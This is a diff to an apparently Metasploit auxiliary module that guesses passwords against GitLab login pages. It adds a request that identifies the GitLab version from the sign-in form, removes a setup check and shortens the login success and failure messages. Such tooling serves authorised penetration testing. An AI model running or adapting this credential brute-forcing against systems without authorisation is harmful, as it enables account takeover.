@@ -35,6 +35,20 @@ class MetasploitModule < Msf::Auxiliary
 
   def run_host(ip)
     uri = normalize_uri(target_uri.path.to_s, 'users', 'sign_in')
+    res = send_request_cgi(
+      'method' => 'GET',
+      'cookie' => 'request_method=GET',
+      'uri' => uri
+    )
+
+    if res && res.body && res.body.include?('user[email]')
+      vprint_status('GitLab v5 login page')
+    elsif res && res.body && res.body.include?('user[login]')
+      vprint_status('GitLab v7 login page')
+    else
+      vprint_error('Not a valid GitLab login page')
+      return
+    end
 
     cred_collection = build_credential_collection(
       username: datastore['USERNAME'],
@@ -51,12 +65,6 @@ class MetasploitModule < Msf::Auxiliary
       )
     )
 
-    msg = scanner.check_setup
-    if msg
-      print_error("#{peer} - #{msg}")
-      return
-    end
-
     scanner.scan! do |result|
       credential_data = result.to_h
       credential_data.merge!(
@@ -68,10 +76,10 @@ class MetasploitModule < Msf::Auxiliary
         credential_data[:core] = credential_core
         create_credential_login(credential_data)
 
-        print_good "#{Rex::Socket.to_authority(ip, rport)} - Login Successful: #{result.credential}"
+        print_good "Login Successful: #{result.credential}"
       else
         invalidate_login(credential_data)
-        vprint_error "#{Rex::Socket.to_authority(ip, rport)} - LOGIN FAILED: #{result.credential} (#{result.status})"
+        vprint_error "LOGIN FAILED: #{result.credential} (#{result.status})"
       end
     end
   end
